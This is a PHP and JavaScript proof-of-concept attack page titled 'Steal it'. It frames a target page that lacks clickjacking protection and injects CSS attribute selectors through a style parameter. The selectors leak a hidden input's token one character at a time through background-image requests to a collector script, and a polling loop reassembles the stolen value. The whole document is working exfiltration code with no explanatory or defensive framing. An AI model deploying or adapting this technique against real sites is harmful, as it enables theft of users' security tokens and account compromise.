<!DOCTYPE html>
<html>
<head>
	<title>Steal it</title>
</head>
<body>
	<!--Inspired by http://eaea.sirdarckcat.net/cssar/v2/-->
	<h1 style='color:red'>No XFO header plus vulnerable to CSS injection(?style)</h1>
	<?php
		if(!file_exists('token.txt')){
			$handle = fopen('token.txt','w');
			fclose($handle);
		}
		if(isset($_GET['token'])){
			$handle = fopen("token.txt",'w');
			fwrite($handle, $_GET['token']);
			fclose($handle);
		}
		if(isset($_GET['complete'])){
			echo "Completed<br>Token<br>".file_get_contents('token.txt')."</b>";
			die();

		}
	?>
	<iframe src="index.php" frameborder=1></iframe>
	<br>
	Token::
	<p id='demo'></p>
	<script>

		var poss_combo = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789".split('');
		var lol;
		function request(val,number){
			console.log(number);
			if(number >= 61){
				var final_value = document.querySelector('#demo').textContent;
				lol = 'exit';
				return;
			}
			document.querySelector('iframe').src = "index.php?style=input[type='text']%2binput[value^='"+val+poss_combo[number]+"']{background-image:url('frame.php?token="+val+poss_combo[number]+"')}";
			console.log(document.querySelector('iframe').src);


		}

		function check_token_file(){
			var xhttp = new XMLHttpRequest();
			xhttp.onreadystatechange = function(){
				if(xhttp.readyState == 4 && xhttp.status == 200){
					var back = xhttp.responseText;
					document.querySelector('#demo').textContent = back;
				}
			}
			xhttp.open('GET','token.txt?a='+ new Date().getTime(),true);
			xhttp.send();
		}			
		
		var num = 0;
		var prev = document.querySelector('#demo').textContent;

		function execution(){
			if(lol == 'exit'){
				clearInterval(execution);
				return;
			}
			check_token_file();
			var new_val = document.querySelector('#demo').textContent;
			if(prev != new_val){
				prev = new_val;
				num = 0;
			}
			request(new_val,num++);
		}
		setInterval(execution,1000);
	</script>
</body>
</html>